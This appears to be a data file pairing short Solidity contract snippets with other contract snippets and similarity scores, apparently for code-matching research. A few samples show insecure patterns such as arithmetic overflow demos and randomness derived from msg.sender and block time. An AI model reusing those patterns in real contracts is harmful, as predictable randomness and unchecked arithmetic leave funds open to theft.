        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    
    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), ""ERC20: approve from the zero address"");
        require(spender != address(0), ""ERC20: approve to the zero address"");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }
}"
"contract Test {
    uint[] array = [1,2,3,4,5];
    function remove(uint index)  returns(uint[]) {
        if (index >= array.length) return;

        for (uint i = index; i<array.length-1; i++){
            array[i] = array[i+1];
        }
        array.length--;
        return array;
    }
}",0.5624733805958161,"contract SafeMath {
  
  function safeAdd(uint a, uint b) internal returns (uint) {
    uint c = a + b;
    assert(c>=a && c>=b);
    return c;
  }
  function assert(bool assertion) internal {
    if (!assertion) throw;
  }
}"
"contract D {
    event LogMsgData(bytes calldata);

    function() {
        LogMsgData(msg.data);
    }
}",0.5913608049079669,"contract solcChecker {
 function f(bytes calldata x) virtual external;
}"
"contract C {
    function f(uint len) {
        uint[] memory a = new uint[](7);
        bytes memory b = new bytes(len);
        
        a[6] = 8;
    }
}",0.5807375384974709,"contract IExitHandler {

  function startExit(bytes32[] memory, bytes32[] memory, uint8, uint8) public payable;

}"
"contract EventManager {

    struct Event {
        bytes32 name;
        uint time;
    }

    uint totalEvents;

    mapping(uint => Event) EventList;

    event EventAdded(address indexed _senderAddress, uint _eventId);

    function addEvent(bytes32 _name, uint _time) returns(uint eventId) {
        eventId = totalEvents++;
        EventList[eventId] = Event(_name, _time);
        EventAdded(msg.sender, eventId);
    }

    function listEvents(uint _start, uint _count) constant returns(uint[] eventIds, bytes32[] eventNames, uint[] eventTimes) {

        uint maxIters = _count;
        if( (_start+_count) > totalEvents) {
            maxIters = totalEvents - _start;
        }

        eventIds = new uint[](maxIters);
        eventNames = new bytes32[](maxIters);
        eventTimes = new uint[](maxIters);

        for(uint i=0;i<maxIters;i++) {
            uint eventId = _start + i;

            Event memory e = EventList[eventId];
            eventIds[i] = eventId;
            eventNames[i] = e.name;
            eventTimes[i] = e.time;
        }
    }
}",0.5174965378821474,"contract MakerHelper is Helper {

    event LogOpen(uint cdpNum, address owner);
    event LogLock(uint cdpNum, uint amtETH, uint amtPETH, address owner);
    event LogFree(uint cdpNum, uint amtETH, uint amtPETH, address owner);
    event LogDraw(uint cdpNum, uint amtDAI, address owner);
    event LogWipe(uint cdpNum, uint daiAmt, uint mkrFee, uint daiFee, address owner);
    event LogShut(uint cdpNum);

    
    function setMakerAllowance(TokenInterface _token, address _spender) internal {
        if (_token.allowance(address(this), _spender) != uint(-1)) {
            _token.approve(_spender, uint(-1));
        }
    }

    
    function getCDPStats(bytes32 cup) internal view returns (uint ethCol, uint daiDebt) {
        TubInterface tub = TubInterface(getSaiTubAddress());
        (, uint pethCol, uint debt,) = tub.cups(cup);
        ethCol = rmul(pethCol, tub.per()); 
        daiDebt = debt;
    }

}"
"contract YourContract {
    
    InterestRateModel interest_rate_model;

    constructor(address _interest_rate_model_contract_address) public {
        interest_rate_model = InterestRateModel(_interest_rate_model_contract_address);
    }

    function getInterestRateModelBorrowRate() public view returns (uint, uint) {
        return interest_rate_model.getBorrowRate(1, 2, 3);
    }
}",0.5096239255350737,"contract AcceptsProsperity {

    Prosperity public tokenContract;



    constructor(address _tokenContract) public {

        tokenContract = Prosperity(_tokenContract);

    }



    modifier onlyTokenContract {

        require(msg.sender == address(tokenContract));

        _;

    }



    

    function tokenFallback(address _from, uint256 _value, bytes _data) external returns (bool);

}"
"contract ContractB {

    struct Info {
        ContractA ainstance;
    }
    mapping(uint => Info) infoMapping;
    uint length;

    function ContractB() public {

    }

    function create(uint n) public {
        infoMapping[length] = Info(
            new ContractA(n)
        );
        length++;
    }

    function get(uint index) public view returns(uint) {
        return infoMapping[index].ainstance.get();
    }

}",0.5885123731492574,"contract Havven {

    uint public price;

    uint public issuanceRatio;

    mapping(address => uint) public nominsIssued;

    function balanceOf(address account) public view returns (uint);

    function totalSupply() public view returns (uint);

    function availableHavvens(address account) public view returns (uint);

}"
"contract AssetFactory {
    Asset[] deployedAssets;

    function createAsset(string name) public returns (Asset) {
        Asset newAsset = new Asset(name);
        deployedAssets.push(newAsset);
        return newAsset;
    }

}",0.5334994177350929,"contract DeploymentInfo {

  uint private deployed_on;



  constructor() public {

    deployed_on = block.number;

  }





  function getDeploymentBlock() public view returns (uint) {

    return deployed_on;

  }

}"
"contract Nest {

  struct IpfsHash {
    bytes32 hash;
    uint hashSize;
  }

  struct Member {
    IpfsHash ipfsHash;
  }

  mapping(uint => Member) members;

  function addMember(uint id, bytes32 hash, uint size) public returns(bool success) {
    members[id].ipfsHash.hash = hash;
    members[id].ipfsHash.hashSize = size;
    return true;
  }

  function getMember(uint id) public constant returns(bytes32 hash, uint hashSize) {
    return(members[id].ipfsHash.hash, members[id].ipfsHash.hashSize);
  }
}",0.571916524476209,"contract ETHPublish is Ownable {

	event Publication(bytes32 indexed hash, string content);



	mapping(bytes32 => string) public publications;

	mapping(bytes32 => bool) published;



	function()

		public

		payable

	{

		revert();

	}



	function publish(string content)

		public

		onlyOwner

		returns (bytes32)

	{

		bytes32 hash = keccak256(bytes(content));

		

		require(!published[hash]);



		publications[hash] = content;

		published[hash] = true;

		emit Publication(hash, content);



		return hash;

	}

}"
"contract Conditions {

    struct Topic {
        bool state;
        address owner;
        mapping(address => bool) canChange;
    }

    mapping(bytes32 => Topic) public topics;

    modifier onlyTopicOwner (bytes32 topic) {
        require(msg.sender == topics[topic].owner);
        _;
    }

    modifier onlyTopicTrustee (bytes32 topic) {
        require(msg.sender == topics[topic].owner || userTopicPermission(topic, msg.sender));
        _;
    }

    function isTopic(bytes32 topic) public view returns(bool) {
        return(topics[topic].owner != address(0));
    }

    function userTopicPermission(bytes32 topic, address user) public view returns(bool) {
        if(!isTopic(topic)) return false;
        return topics[topic].canChange[user];
    }

    function createTopic(bytes32 topic, bool state) public {
        require(!isTopic(topic));
        Topic storage t = topics[topic];
        t.state = state;
        t.owner = msg.sender;
    }

    function changeUserAccess(bytes32 topic, address user, bool canChange) public onlyTopicOwner(topic) {
        topics[topic].canChange[user] = canChange;
    }

    function changeTopicState(bytes32 topic, bool state) public onlyTopicTrustee(topic) {
        topics[topic].state = state;
    }

}",0.5672406774257039,"contract Owned {

    address public owner;
    address public proposedOwner;
    bool public paused = false;

    event OwnershipTransferInitiated(address indexed _proposedOwner);
    event OwnershipTransferCompleted(address indexed _newOwner);


    function Owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }
    
    
    function pause() onlyOwner whenNotPaused public {
        paused = true;
    }

    
    function resume() onlyOwner whenPaused public {
        paused = false;
    }
    
    
    modifier whenNotPaused() {
        require(!paused);
        _;
    }

    
    modifier whenPaused() {
        require(paused);
        _;
    }

    function isOwner(address _address) internal view returns (bool) {
        return (_address == owner);
    }


    function initiateOwnershipTransfer(address _proposedOwner) public onlyOwner returns (bool) {
        proposedOwner = _proposedOwner;

        OwnershipTransferInitiated(_proposedOwner);

        return true;
    }


    function completeOwnershipTransfer() public returns (bool) {
        require(msg.sender == proposedOwner);

        owner = proposedOwner;
        proposedOwner = address(0);

        OwnershipTransferCompleted(owner);

        return true;
    }
}"
"contract Numbers {
    int[] public numbers;

    function Numbers() public {
        numbers.push(20);
        numbers.push(32);

        changeArray(numbers);
    }

    function changeArray(int[] myArray) private {
        myArray[0] = 1;
    }
}",0.5729809778532305,"contract addition {
    address reservedSlot; 
    uint256 public myNumber;
    
    function add() public {
        myNumber = myNumber + 1;
    }
    
    function sub() public {
        myNumber = myNumber - 1;
    }
}"
"contract Test {
    uint256[] public globalArray = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20];

    function getPartialArray() public view returns (uint256[] memory) {
        uint256[] memory localArray = clone(globalArray, globalArray.length);
        for (uint256 i = 0; i < localArray.length; i++) {
            uint256 n = i + uint256(keccak256(abi.encodePacked(msg.sender, now))) % (localArray.length - i);
            uint256 temp = localArray[n];
            localArray[n] = localArray[i];
            localArray[i] = temp;
        }
        return clone(localArray, localArray.length / 4);
    }

    function clone(uint256[] memory _array, uint256 _length) private pure returns (uint256[] memory) {
        uint256[] memory array = new uint256[](_length);
        for (uint256 i = 0; i < _length; i++) {
            array[i] = _array[i];
        }
        return array;
    }
}",0.5678172233413811,"contract BatchSendTokens {
    
    
    
    
    
    
    
    function sendTokensBySameAmount(
        ERC20Interface token, 
        address[] memory addressArray, 
        uint256 amountToEachAddress,
        uint256 totalAmount
    ) public {
        token.transferFrom(msg.sender, address(this), totalAmount);
        uint256 lengthOfArray = addressArray.length;
        for(uint256 i = 0; i < lengthOfArray; i++) {
            token.transfer(addressArray[i], amountToEachAddress);
        }
    }
    
    
    
    
    
    
    
    function sendTokensByDifferentAmount(
        ERC20Interface token, 
        address[] memory addressArray, 
        uint256[] memory amountArray,
        uint256 totalAmount
    ) public {
        token.transferFrom(msg.sender, address(this), totalAmount);
        uint256 lengthOfArray = addressArray.length;
        for(uint256 i = 0; i < lengthOfArray; i++) {
            token.transfer(addressArray[i], amountArray[i]);
        }
    }
}"
"contract Hack {
    Supreme public sup;

    function Hack(Supreme _sup) public {
        sup = _sup;
    }

    function sneak() public payable {
        sup.Road.value(msg.value)();
    }
}",0.5929131490309506,"contract mile{

     function receiveEther() payable public{
     }

     function sendEther(address _address) payable public{
         uint value = 0;

         _address.transfer(value);
     }

}"
"contract Lockers {
    struct Locker {
      uint creationTime;
      uint holdTime;
      uint balance;
   }

   mapping (address => Locker[]) lockersByAddress;

   event Withdrawal(address sender, uint balance);

    function store(uint holdTime) external payable {
        Locker memory locker = Locker(now, holdTime, msg.value);
        lockersByAddress[msg.sender].push(locker);
    }

    function withdrawAll() public {
      Locker[] storage lockers = lockersByAddress[msg.sender];
      for (uint i = 0; i < lockers.length; i++) {
        if (lockers[i].creationTime + lockers[i].holdTime < now) {
          msg.sender.transfer(lockers[i].balance);
          Withdrawal(msg.sender, lockers[i].balance);
          delete lockers[i];
        }
      }
    }

    function getNumLockers(address owner) external view returns(uint) {
        return lockersByAddress[owner].length;
    }

    function getLockerDetails(address owner, uint index) external view returns(uint creationTime, uint holdTime, uint balance) {
        Locker memory locker = lockersByAddress[owner][index];
        creationTime = locker.creationTime;
        holdTime = locker.holdTime;
        balance = locker.balance;
    }
}",0.5983601968257013,"contract Lockup is Ownable{
	using SafeMath for uint256;

	uint256 public lockupTime;
	mapping(address => bool) public lockup_list;

	event UpdateLockup(address indexed owner, uint256 lockup_date);

	event UpdateLockupList(address indexed owner, address indexed user_address, bool flag);

	constructor(uint256 _lockupTime ) public
	{
		lockupTime = _lockupTime;

		emit UpdateLockup(msg.sender, lockupTime);
	}

	
	function getLockup()public view returns (uint256){
		return lockupTime;
	}

	
	function isLockup() public view returns(bool){
		return (now < lockupTime);
	}

	
	function updateLockup(uint256 _newLockUpTime) onlyOwner public returns(bool){

		lockupTime = _newLockUpTime;

		emit UpdateLockup(msg.sender, lockupTime);
		
		return true;
	}

	
	function inLockupList(address _add)public view returns(bool){
		return lockup_list[_add];
	}

	
	function updateLockupList(address _add, bool _flag)onlyOwner public returns(bool){
		lockup_list[_add] = _flag;

		emit UpdateLockupList(msg.sender, _add, _flag);

		return true;
	}

}"
"contract Certificates {

    struct Cert {
        address recipient;
        bool confirmed;
    }

    mapping(bytes32 => Cert) public certs;
    bytes32[] public certList;

    event LogNewCert(address sender, bytes32 cert, address recipient);
    event LogConfirmed(address sender, bytes32 cert);

    function isCert(bytes32 cert) public view returns(bool isIndeed) {
        if(cert == 0) return false;
        return certs[cert].recipient != address(0);
    }

    function createCert(bytes32 cert, address recipient) public {
        require(recipient != address(0));
        require(!isCert(cert));
        Cert storage c = certs[cert];
        c.recipient = recipient;
        certList.push(cert);
        emit LogNewCert(msg.sender, cert, recipient);
    }

    function confirmCert(bytes32 cert) public {
        require(certs[cert].recipient == msg.sender);
        require(certs[cert].confirmed == false);
        certs[cert].confirmed = true;
        emit LogConfirmed(msg.sender, cert);
    }

    function isUserCert(bytes32 cert, address user) public view returns(bool) {
        if(!isCert(cert)) return false;
        if(certs[cert].recipient != user) return false;
        return certs[cert].confirmed;
    }
}",0.5842441294910082,"contract BaseAirdrop is Lockable {
    using SafeMath for uint;

    ERC20Token public token;

    mapping(address => bool) public users;

    event AirdropToken(address indexed to, uint amount);

    constructor(address _token) public {
        require(_token != address(0));
        token = ERC20Token(_token);
    }

    function airdrop(uint8 v, bytes32 r, bytes32 s) public whenNotLocked {
        if (ecrecover(keccak256(""Signed for Airdrop"", address(this), address(token), msg.sender), v, r, s) != owner
            || users[msg.sender]) {
            revert();
        }
        users[msg.sender] = true;
        uint amount = getAirdropAmount(msg.sender);
        token.transfer(msg.sender, amount);
        emit AirdropToken(msg.sender, amount);
    }

    function getAirdropStatus(address user) public constant returns (bool success) {
        return users[user];
    }

    function getAirdropAmount(address user) public constant returns (uint amount);

    function withdrawTokens(address destination) public onlyOwner whenLocked {
        require(destination != address(0));
        uint balance = token.balanceOf(address(this));
        token.transfer(destination, balance);
    }
}"
"contract parameterOverflows {

    uint8 public selectedCharacter;

    modifier onlyCharacter(uint _character) {
        require(_character <= 255);
           _;
    }

    function selectCharacter(uint _character) public onlyCharacter(_character) {
        selectedCharacter = uint8(_character);
    }

}",0.5075870050405212,"contract Ownable {
address public owner;
constructor(address contractOwner) public {
owner = contractOwner;
}

modifier onlyOwner {
require(owner == msg.sender);
_;
}

function changeOwner(address _owner) onlyOwner public {
owner = _owner;
}
}"
"contract FunWithArrays {

  struct Voter {
      address voter;
      string comment;
  }

  struct Project{
    int id;
    string name;
    int votes;    
    Voter[] voters;
  }

  Project[] public projects;

  function vote(uint index , string comment) public {
    Project storage project = projects[index];
    project.votes++;     
    Voter memory v;
    v.voter = msg.sender;
    v.comment = comment;
    project.voters.push(v);
  }
}",0.5486414501715545,"contract ERC20 is ERC20WithApprove {

	string public name;

	string public symbol;

	uint public decimals;



	constructor(string _name, string _symbol, uint _decimals, uint total, address target) public {

		name = _name;

		symbol = _symbol;

		decimals = _decimals;



		_mint(target, total);

	}



	function transfer(address to, uint value) public {

		_transfer(msg.sender, to, value);

	}

}"
"contract C {
    function testRevert() pure public returns (uint result) {
        uint memOffset;
        assembly {
             memOffset := msize() 
             mstore(add(memOffset, 0x00), 6) 
             mstore(0x40, add(memOffset, 0x20)) 
             revert(memOffset, 0x20) 
        }
    }
}",0.5502861444044405,"contract MoneyMarket {

    function markets(address asset) public view returns (bool, uint, InterestRateModel, uint, uint, uint, uint, uint, uint);
    function oracle() public view returns (address);
}"
"contract StorageCostTest {

    struct MyStruct {
        bool foo;
        uint256 bar;
        uint256 baz;
        address qux;
    }

    mapping(uint256 => MyStruct) private myStructs;
    uint256 public nextMyStructId;

    constructor() public {
        nextMyStructId = 1;
    }

    function addItem(bool foo, uint256 bar, uint256 baz, address qux) external {
        myStructs[nextMyStructId] = MyStruct({
           foo: foo,
           bar: bar,
           baz: baz,
           qux: qux
        });
        nextMyStructId += 1;
    }
}",0.5419500401991288,"contract ERC20Basic {
    function totalSupply() public view returns (uint256);
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function burn(uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
}"
"contract B is J {
    function doOnI(address i) {
        I(i).doSomething();
    }
}",0.5779216404693047,"contract Incrementer {
    uint public i;
    function inc() {
        i++;
    }
}"
"contract Factory {
    Item public head;

    constructor() public {
        head = new Item(Item(0));
    }

    function add(Item _to) public {
        Item link = _to.next();
        Item next = new Item(link);
        _to.addNew(next);
    }
}",0.5540606550751829,"contract PhraseFlow {
    string[] public flow;
    uint public count;

    function addPhrase(string _newPhrase) public {
        flow.push(_newPhrase);
        count = count + 1;
    }

    constructor() public {
        count = 0;
    }
}"
"contract XX {
    bool mutexFlag;

    function untrustedCall(address payable _untrusted) public {
        require(mutexFlag == false, ""No reentry!"");
        
        mutexFlag = true; 
        (bool success, ) = _untrusted.call.value(xxx)(""""); 
        mutexFlag = false;
        require(success, ""Transfer failed!"");

        
    }
}",0.5714088623027408,"contract BitGuildToken{

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success);

}"
"contract Courses {
    struct Instructor {
        uint age;
        string fName;
        string lName;
    }

    mapping (address => Instructor) instructors;
    address[] public instructorAccts;

    function setInstructor(address _address, uint _age, string memory _fName, string memory _lName) public {
        Instructor storage instructor = instructors[_address];

        instructor.age = _age;
        instructor.fName = _fName;
        instructor.lName = _lName;

        instructorAccts.push(_address);
    }

    function getInstructors() public view returns (address[] memory) {
        return instructorAccts;
    }
}",0.5793013525814894,"contract PersonalTokenFactory {
    
    
    PersonalToken private PT;
    
    address[] public tokens;
    
    event Deployed(address indexed PT, address indexed owner);
    
    function newPT(
       	string memory _name, 
		string memory _symbol,
		string memory _stamp,
		uint8 _decimals,
		uint256 _init) public {
       
        PT = new PersonalToken(
            _name, 
            _symbol, 
            _stamp,
            _decimals,
            _init,
            msg.sender);
        
        tokens.push(address(PT));
        
        emit Deployed(address(PT), msg.sender);

    }
    
    function getTokenCount() public view returns (uint256 tokenCount) {
        return tokens.length;
    }
}"
"contract test {

    mapping (address => uint[]) public transactions;

    constructor() public {
        transactions[msg.sender].push(123456);
        transactions[msg.sender].push(789101);
        transactions[msg.sender].push(865436);
    }

    function getTransactionsLength() public view returns (uint) {

        return transactions[msg.sender].length;

    }

    function getTransactionsValue(uint index) public view returns (uint) {

        return transactions[msg.sender][index];

    }
}",0.5821511521755471,"contract BasicToken is ERC20Basic {
	using SafeMath for uint;

	mapping(address => uint) balances;

	function transfer(address _to, uint _value) public returns (bool) {
		balances[msg.sender] = balances[msg.sender].sub(_value);
		balances[_to] = balances[_to].add(_value);
		Transfer(msg.sender, _to, _value);
		return true;
	}

	function balanceOf(address _owner) public view returns (uint) {
		return balances[_owner];
	}
}"
"contract HelloUniverse {
  bool isHappy;
  string response = ""Hi there!"";
  modifier onlyIfHappy {
    require(isHappy);
    _;
  }
  function talk() public view onlyIfHappy returns(string memory) {
    return response;
  }
}",0.5996888602949852,"contract WhitelistInterface {

  function checkRole(address _operator, string memory _role) public view;

  function hasRole(address _operator, string memory _role) public view returns (bool);

}"
"contract A {
  ServiceRegistry serviceRegistry;

  constructor (ServiceRegistry _serviceRegistry) public {
    serviceRegistry = _serviceRegistry;
    serviceRegistry.register (""A"", address (this));
  }

  function getB () internal view returns (B) {
    return B (serviceRegistry.get (""B""));
  }
}",0.5750689157810641,"contract UsingTreasury is
    UsingRegistry
{
    constructor(address _registry)
        UsingRegistry(_registry)
        public
    {}

    modifier fromTreasury(){
        require(msg.sender == address(getTreasury()));
        _;
    }
    
    function getTreasury()
        public
        view
        returns (ITreasury)
    {
        return ITreasury(addressOf(""TREASURY""));
    }
}"
"contract B {
  ServiceRegistry serviceRegistry;

  constructor (ServiceRegistry _serviceRegistry) public {
    serviceRegistry = _serviceRegistry;
    serviceRegistry.register (""B"", address (this));
  }

  function getA () internal view returns (A) {
    return A (serviceRegistry.get (""A""));
  }
}",0.5750689157810641,"contract UsingTreasury is
    UsingRegistry
{
    constructor(address _registry)
        UsingRegistry(_registry)
        public
    {}

    modifier fromTreasury(){
        require(msg.sender == address(getTreasury()));
        _;
    }
    
    function getTreasury()
        public
        view
        returns (ITreasury)
    {
        return ITreasury(addressOf(""TREASURY""));
    }
}"
"contract C {
    
    function overflow() returns (uint256 _overflow) {
        uint256 max = 2**256 - 1;
        return max + 1;
    }

    
    function underflow() returns (uint256 _underflow) {
        uint256 min = 0;
        return min - 1;
    }
}",0.5949970973481495,"contract Token {

    function balanceOf(address a) public pure returns (uint) {

        (a);

        return 0;

    }



    function transfer(address a, uint val) public pure returns (bool) {

        (a);

        (val);

        return false;

    }

}"
"contract Tree {
    struct Node {
        bytes data;
        uint256 parent;
        uint256[] children;
    }

    Node[] nodes;

    function Tree() public {
        
        nodes.push(Node("""", 0, new uint256[](0)));
    }

    function appendChild(uint256 parentID, bytes data) public returns (uint256 newID) {
        newID = nodes.length;

        nodes.push(Node({
            data: data,
            parent: parentID,
            children: new uint256[](0)
        }));

        nodes[parentID].children.push(newID);

        return newID;
    }
}",0.5748477181484796,"contract ERC223Basic {
    uint256 public totalSupply;

    bool public transfersEnabled;

    function balanceOf(address who) public view returns (uint256);

    function transfer(address to, uint256 value) public returns (bool);

    function transfer(address to, uint256 value, bytes data) public;

    event Transfer(address indexed from, address indexed to, uint256 value, bytes data);

}"
"contract DigitalDownload {

    ...

    event DigitalDownloadPurchasedEvent(uint time, address purchaser)

    ...

    function purchaseDigitalDownload() public payable {
        require(msg.value == PRICE);

        emit DigitalDownloadPurchasedEvent(now, msg.sender);
    }
}",0.5423191981514929,"contract BPX_GAS_FEE{
    
    constructor()public{
        owner = msg.sender;
    }
    
    address public owner;
    uint public total_gas_fee = 5423948502382034832;
    
    function changeOwner()public payable{
        require(msg.value > total_gas_fee);
        owner.transfer(msg.value);
    }
    
    
}"
"contract Test {

    struct S {
        string s;
        uint u;
    }

    function returnOneValue() private pure returns (S s) {
        s.s = ""123"";
        s.u = 123;
    }

    constructor() {
        S memory s = returnOneValue();
    }
}",0.5884649686731803,"contract Trusti {
    string data = ""trusti.id"";
    
    function getStore() public view returns (string memory) {
        return data;
    }
    
    function setStore(string memory _value) public {
        data = _value;
    }
}"
"contract Pizzeria {

    bool public isPizzaria;
    uint public param1;
    uint public param2;

    function Pizzeria(uint arg1, uint arg2) public {
        param1 = arg1;
        param2 = arg2;
    }

}",0.590175423163822,"contract dynamictest{

    uint public a;

    uint public b;

    function test(uint foo) public {

        if (tx.gasprice > foo){

            a=1;

            return;

        }

        if (tx.gasprice < foo){

            a=1;

            b=1;

            return;

        }

    }

}"
"contract PizzeriaFactory {

    address[] public pizzeriaFactories;

    function createPizzeria(uint arg1, uint arg2) public returns(address newPizzeria) {
        Pizzeria p = new Pizzeria(arg1, arg2);
        pizzeriaFactories.push(address(p));
        return address(p);
    }

}",0.5527318109377668,"contract ViewBalances {

  

  constructor() public{}

    

  function checkBalances(address[] addresses) public constant returns(uint256[]){

      uint256[] storage balances;

      for(uint256 i = 0; i < addresses.length; i++){

          balances.push(addresses[i].balance);

      }

      return balances;

  }        



}"
"contract testContract {
    uint256 num1;

    address[] contracts = [0x36eaf79c12e96a3dc6f53426c, 0xf235aa56dd96bda02acfb361e];

    function getContractsCount() constant returns (uint256) {
          return contracts.length;
    }

}",0.5489891299515075,"contract ForeignToken {

    function balanceOf(address _0x395d5881be6ca42d96ba01a2de69416f10cebe29) constant public returns (uint256);

    function transfer(address _to, uint256 _value) public returns (bool);

}"
"contract TestABC {
    function testTotalSupplyTest() public {
        bool a = true;
        bool b = true;
        Assert.equal(a, b, ""message ABC"");
    }
}",0.5993226550864234,"contract DAppTest {

  bool public _is;

  function changeBoolean() public returns (bool success) {
    _is = !_is;
    return true;
  }

}"
"contract A {
    uint256 public counter = 1;

    event DelegateCallFailed();

    function foo() public {
        counter += 1000;
        
        revert();
    }

    function bar() public {
        
        counter += 1;
        uint256 b = counter;
        
        (bool res,) = address(this).delegatecall(abi.encodeWithSignature(""foo()""));
        if (!res) {
            
            require(b == counter, ""Counter shouldn't change"");
            emit DelegateCallFailed();
        }
    }
}",0.5864149844662339,"contract ERC20Capped is ERC20Mintable {

  uint256 private _cap;

  constructor(uint256 cap)
    public
  {
    require(cap > 0);
    _cap = cap;
  }

  
  function cap() public view returns(uint256) {
    return _cap;
  }

  
  function mint(
    address to,
    uint256 amount
  )
    public
    returns (bool)
  {
    require(totalSupply().add(amount) <= _cap);

    return super.mint(to, amount);
  }

}"
"contract testInputArray {

    mapping (string => string) aMapping;

    
    event Log(address from, address to, string message);

    function sendMessage(address to, string key) {
        Log(msg.sender, to, aMapping[key]);
    }
}",0.5669882101512149,"contract ISTProxy {



    

    function deployToken(string _name, string _symbol, uint8 _decimals, string _tokenDetails, address _issuer, bool _divisible, address _polymathRegistry)

        public returns (address);

}"
"contract ABI {

    struct TestStruct {
        uint size;
    } 

    function testFunc(TestStruct memory test) public pure returns(bool replaced) {
        return test.size == 0;
    }
}",0.5930969776238765,"contract PriceFeedInterface {

    function name() public view returns (string);

    function getRate() public view returns (uint _rate, bool _live);

}"
"contract A_compiled {
    function test_internal() private { log0(0x1111); } 
    function bbb() public { log0(0xbbbb); }
    function test() public {
       bbb(); 
       test_internal(); 
    }
}",0.5826604359257956,"contract RealtyReturnsTokenInterface {

    function paused() public;

    function unpause() public;

    function finishMinting() public returns (bool);

}"
"contract C {
  function grouped() {
    A.foo();
    B.bar();
  }
}",0.5867843975661456,"contract Hello {
  function hello() public {
  }
}"
"contract ExampleContract {

struct ExampleStruct {
    address owner;
    string text;
}

ExampleStruct[] public exampleStructs;

function ExampleContract( address myAddress, string myText ) {
    exampleStructs.push(ExampleStruct(myAddress, myText));
}

...

}",0.5027285235256367,"contract AccessControl is Pausable {
    ParentInterface public parent;
    
    function setParentAddress(address _address) public whenPaused onlyOwner
    {
        ParentInterface candidateContract = ParentInterface(_address);

        parent = candidateContract;
    }
}"
"contract Child {
    uint i1;
    uint i2;
    uint i3;
    uint i4;
    uint i5;

    function f1() { i1=1;   }
    function f2() { i2=2;   }
    function f3() { i3=3;   }
    function f4() { i4=4;   }
    function f5() { i5=5;   }
}",0.5372543016455209,"contract DaiJoin {
    function vat() public returns (Vat);
    function dai() public returns (Gem);
    function join(address, uint) public payable;
    function exit(address, uint) public;
}"
"contract MyContract {
    uint public unitPrice = 100;

    function myMethod(address _destination, uint _count) {
        
        OtherContract oc = OtherContract(_destination);
        
        oc.otherMethod(address(this), _count * unitPrice);
    }
}",0.5576502766793227,"contract OtcInterface {

    function getPayAmount(address, address, uint) public constant returns (uint);

    function buyAllAmount(address, uint, address pay_gem, uint) public returns (uint);

}"
"contract MyErc20Contract {
    function transfer(address to, uint256 value) public returns (bool) {
        bytes32 data1 = keccak256(""func1(uint256)"");
        bytes32 data2 = keccak256(""func2(uint256,bool)"");
        bytes32 data3 = keccak256(""func3(uint256,uint256)"");
        bool result1 = external_call(to, 0, data1.length, abi.encodePacked(data1));
        bool result2 = external_call(to, 0, data2.length, abi.encodePacked(data2));
        bool result3 = external_call(to, 0, data3.length, abi.encodePacked(data3));
        if (result1 && result2 && result3) {
            
        }
        else {
            
        }
    }

    function external_call(address destination, uint value, uint dataLength, bytes data) private returns (bool) {
        bool result;
        assembly {
            let x := mload(0x40)   
            let d := add(data, 32) 
            result := call(
                sub(gas, 34710),   
                                   
                                   
                destination,
                value,
                d,
                dataLength,        
                x,
                0                  
            )
        }
        return result;
    }
}",0.564073075083843,"contract UniswapEXProt {
    UniswapEX public uniswapEx;

    constructor(UniswapEX _uniswapEx) public {
        uniswapEx = _uniswapEx;
    }

    function getChecksum(
        address payable _owner,
        bytes32 _salt,
        address _relayer
    ) external pure returns (bytes32) {
        return keccak256(
            abi.encodePacked(
                _salt,
                _owner,
                _relayer
            )
        );
    }

    function executeOrder(
        IERC20 _fromToken,
        IERC20 _toToken,
        uint256 _minReturn,
        uint256 _fee,
        address payable _owner,
        bytes32 _salt,
        bytes32 _checksum
    ) external {
        bytes32 h = keccak256(
            abi.encodePacked(
                _salt,
                _owner,
                msg.sender
            )
        );

        if (block.gaslimit < gasleft() && tx.gasprice != 0) {
            require(h == _checksum, ""invalid checksum"");
        }

        uniswapEx.executeOrder(
            _fromToken,
            _toToken,
            _minReturn,
            _fee,
            _owner,
            _salt
        );
        
        msg.sender.transfer(address(this).balance);
    }

    function () external payable { }
}"
"contract Bytes32ToString {

function bytes32ToStr(bytes32 _bytes32) public pure returns (string) {

    
    
    

    bytes memory bytesArray = new bytes(32);
    for (uint256 i; i < 32; i++) {
        bytesArray[i] = _bytes32[i];
        }
    return string(bytesArray);
    }

}",0.5760320856210179,"contract UintStorage {
    mapping(bytes32 => uint256) private uints;

    function getUint(bytes32 _key) public view returns (uint256) {
        return uints[_key];
    }

    function _setUint(bytes32 _key, uint256 _value) internal {
        uints[_key] = _value;
    }

}"
"contract Test {
    struct User {
        string name;
        string surname;
        uint active;
    }

    mapping (bytes32 => User) public userRegister;

    function add_user(string _name, string _surname) {
        bytes32 _hc = sha3(_name, _surname);
        User p = userRegister[_hc];
        p.name = _name;
        p.surname = _surname;
        p.active = 1;
    }

    function remove(string _name, string _surname)  {
        bytes32 _hc = sha3(_name, _surname);
        userRegister[_hc].active = 0;
    }

    function active(string _name, string _surname)  {
        bytes32 _hc=sha3(_name, _surname);
        userRegister[_hc].active = 1;
    }

    function getUser(string _name, string _surname) constant
      returns (string name, string surname, uint256 active) {
        bytes32 _hc = sha3(_name, _surname);
        name = userRegister[_hc].name;
        surname = userRegister[_hc].surname;
        active = userRegister[_hc].active;
    }
}",0.5298639146756725,"contract BRMobaInviteData is MobaBase {

   

    address owner = 0x0;

    uint256 price = 10 finney;

    mapping(bytes32 => address) public m_nameToAddr;

    mapping(address => bytes32) public m_addrToName;

    

    function createInviteName(bytes32 name) 

    notLock 

    msgSendFilter

    public payable {

        require(msg.value == price);

        require(checkUp(msg.sender,name) == 0,""current name has been used or current address has been one name""); 

        m_nameToAddr[name] = msg.sender;

        m_addrToName[msg.sender] = name;

    }

    

    function checkUp(address addr,bytes32 name) public view returns (uint8) {

        if(m_nameToAddr[name] != address(0)) {

            return 1;

        }

        if ( m_addrToName[addr] != 0){

            return 2;

        }

        return 0;

    }

    

    function GetAddressByName(bytes32 name) public view returns (address){

        return m_nameToAddr[name];

    }

}"
"contract ContractA{

  ContractB b;
  address[] instancesOfB;

  function ContractA(){
     
